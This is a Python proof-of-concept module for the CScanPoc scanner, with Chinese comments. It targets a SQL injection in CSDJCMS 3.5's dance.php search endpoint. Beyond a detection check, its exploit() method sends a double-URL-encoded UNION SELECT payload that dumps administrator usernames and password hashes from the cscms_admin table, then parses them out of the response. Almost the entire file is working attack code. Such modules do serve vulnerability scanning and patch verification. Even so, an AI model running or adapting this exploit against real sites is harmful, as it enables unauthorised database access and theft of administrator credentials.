# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'CSDJCMS_0000'  # 平台漏洞编号，留空
    name = 'CSDJCMS /app/controllers/dance.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-03'  # 漏洞公布时间
    desc = '''
        CSDJCMS 3.5 app/controllers/dance.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1771/'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=59088
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
    product_version = '3.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f48995b5-be78-4c8b-a823-330bd96e1af3'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/index.php/dance/so/key/?key=%252527)%20%2561%256E%2564%201=2%20union%20%2573"
                       "%2565%256C%2565%2563%2574%201,md5(4684894),3,4,5,6,7,8,9,10,11,12,13,14,15,16,"
                       "17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42%20%23")
            verify_url = '{target}'.format(target=self.target)+payload
            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if '904c23abadd5a4648a973c86385f3930' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            vul_url = '{target}'.format(target=self.target)

            payload = ("/index.php/dance/so/key/?key=%252527)%20%2561%256E%2564%201=2%20union%20%2573"
                       "%2565%256C%2565%2563%2574%201,concat(CS_AdminName,0x3a,CS_AdminPass),3,4,5,6,"
                       "7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,"
                       "34,35,36,37,38,39,40,41,42%20from%20cscms_admin%23")
            request = urllib.request.Request(vul_url + payload)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            pattern = re.compile(
                r'.*?<a[^>]*?>(?P<username>[^<>]*?):(?P<password>[^<>]*?)</a>', re.I | re.S)
            match = pattern.match(content)

            if match != None:
                username = match.group('username').strip()
                password = match.group('password').strip()
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
